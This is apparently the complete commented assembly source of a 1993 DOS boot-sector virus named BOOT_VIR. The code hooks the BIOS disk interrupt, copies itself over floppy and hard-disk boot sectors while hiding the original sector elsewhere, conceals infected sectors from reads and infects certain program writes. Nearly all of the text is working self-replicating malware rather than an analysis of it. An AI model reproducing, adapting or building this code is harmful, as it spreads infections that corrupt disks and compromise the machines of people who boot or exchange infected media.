;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€					                                 €€
;€€				BOOT_VIR                                 €€
;€€					                                 €€
;€€      Created:   9-Jul-93		Comments by  Mike M.             €€
;€€					                                 €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

Int60_Offset	equ	180h
Int60_Segment	equ	182h
main_ram_size_	equ	413h
d_0000_07B4_e	equ	7B4h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	0

boot_vir	proc	far

start:
		nop
		nop
		nop
		cli
		xor	ax,ax
		mov	ds,ax
		mov	ss,ax
		mov	sp,7C00h
		mov	si,sp
		sti
		mov	ax,ds:main_ram_size_
		dec	ax
		mov	ds:main_ram_size_,ax
		mov	cl,6
		shl	ax,cl
		push	ax
		mov	es,ax
		mov	cx,200h
		xor	di,di
		rep	movsb
		mov	ax,2Eh
		push	ax
		retf

SectorNum	db	2                  ; Location
Cylinder	db	27h                ; of original
Drive		db	0                  ; boot sector
Side		db	0                  ; on infected disk

boot_vir	endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

main		proc	near
		mov	ax,word ptr ds:[4Ch]
		mov	word ptr ds:[180h],ax
		mov	ax,word ptr ds:[4Eh]
		mov	word ptr ds:[182h],ax
		cli
		mov	ax,78h
		mov	word ptr ds:[4Ch],ax
		mov	word ptr ds:[4Eh],es
		mov	word ptr ds:[188h],ax
		mov	word ptr ds:[18Ah],es
		mov	byte ptr ds:[187h],0EAh
		sti
		push	ds
		push	cs
		pop	ds
		mov	cx,word ptr SectorNum
		mov	dx,word ptr Drive
		cmp	Drive,0
		jne	loc_006D
		push	dx
		push	cx
		xor	bx,bx
		call	sub_019F
		pop	cx
		pop	dx
loc_006D:
		mov	ax,201h
		pop	es
		mov	bx,sp
		push	es
		push	bx
		int	60h			; original Int 13h
		retf
main		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

In13_Handler	proc	near
		cmp	ah,2
		jne	loc_00B9
		cmp	dl,80h
		jae	loc_008A
		cmp	ch,1
		ja	loc_008A
		call	sub_00CF
loc_008A:
		cmp	cx,1
		jne	loc_00CA
		cmp	dh,0
		jne	loc_00CA
		int	60h			; original Int 13h
		jnc	loc_009B

loc_ret_0098:
		retf	2
loc_009B:
		cmp	word ptr es:[bx],9090h
		jne	loc_ret_0098
		push	dx
		push	cx
		push	ax
		pushf
		mov	ax,201h
		mov	cx,es:[bx+2Ah]
		mov	dx,es:[bx+2Ch]
		int	60h			; original Int 13h
		popf
		pop	ax
		pop	cx
		pop	dx
		jmp	short loc_ret_0098
loc_00B9:
		cmp	ah,3
		jne	loc_00CA
		cmp	al,2
		jb	loc_00CA
		cmp	dl,80h
		jae	loc_00CA
		call	sub_0140
loc_00CA:
		int	60h			; original Int 13h
		retf	2
In13_Handler	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_00CF	proc	near
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		mov	al,1
		mov	cx,1
		mov	dh,0
		int	60h			; original Int 13h
		jc	loc_011D
		cmp	word ptr es:[bx],9090h
		je	loc_011D
		mov	ax,es:[bx+13h]
		push	dx
		xor	dx,dx
		div	word ptr es:[bx+18h]
		shr	ax,1
		dec	al
		pop	dx
		mov	dh,0
		mov	cl,2
		mov	ch,al
		mov	ax,301h
		int	60h			; original Int 13h
		jc	loc_011D
		mov	cs:Cylinder,ch
		mov	word ptr cs:Drive,0
		xor	bx,bx
		push	cs
		pop	es
		mov	ax,301h
		mov	cx,1
		mov	dh,0
		int	60h			; original Int 13h
loc_011D:
		call	sub_0126
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		retn
sub_00CF	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0126	proc	near
		push	ds
		xor	bx,bx
		mov	ds,bx
		mov	bx,d_0000_07B4_e
		cmp	word ptr [bx],78h
		jne	loc_013E
		cli
		mov	word ptr [bx],1187h
		mov	word ptr [bx+2],0FF00h
		sti
loc_013E:
		pop	ds
		retn
sub_0126	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0140	proc	near
		cmp	byte ptr es:[bx],0E9h
		jne	loc_ret_016B
		cmp	word ptr es:[bx+1],5000h
		jb	loc_ret_016B
		push	ds
		push	si
		push	di
		push	cx
		mov	di,bx
		push	cs
		pop	ds
		xor	si,si
		mov	cx,200h
		rep	movsb
		mov	byte ptr es:[bx],0E9h
		mov	word ptr es:[bx+1],169h
		pop	cx
		pop	di
		pop	si
		pop	ds

loc_ret_016B:
		retn
sub_0140	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_016C	proc	near
		call	sub_016F

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_016F:
		pop	bx
		push	cs
		pop	es
		sub	bx,16Fh
		mov	byte ptr cs:[bx],90h
		mov	word ptr cs:[bx+1],9090h
		xor	ax,ax
		mov	ds,ax
		cmp	word ptr ds:d_0000_07B4_e,1187h
		je	loc_019B
		les	di,dword ptr ds:d_0000_07B4_e
		mov	ds:Int60_Offset,di
		mov	ds:Int60_Segment,es
		call	sub_019F
loc_019B:
		mov	ah,4Ch
		int	21h

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_019F:
		mov	ax,201h
		push	bx
		push	ax
		mov	cx,1
		mov	dx,80h
		add	bx,200h
		int	60h			; original Int 13h
		pop	ax
		jc	loc_01D4
		cmp	word ptr es:[bx],9090h
		je	loc_01D4
		inc	ah
		push	ax
		inc	cl
		int	60h			; original Int 13h
		pop	ax
		jc	loc_01D4
		pop	bx
		mov	byte ptr es:[bx+2Ch],80h
		mov	byte ptr es:[bx+2Bh],0
		dec	cl
		int	60h			; original Int 13h
		retn
loc_01D4:
		pop	bx
		retn
sub_016C	endp

		db	40 dup (90h)
		db	 55h,0AAh

seg_a		ends



		end	start
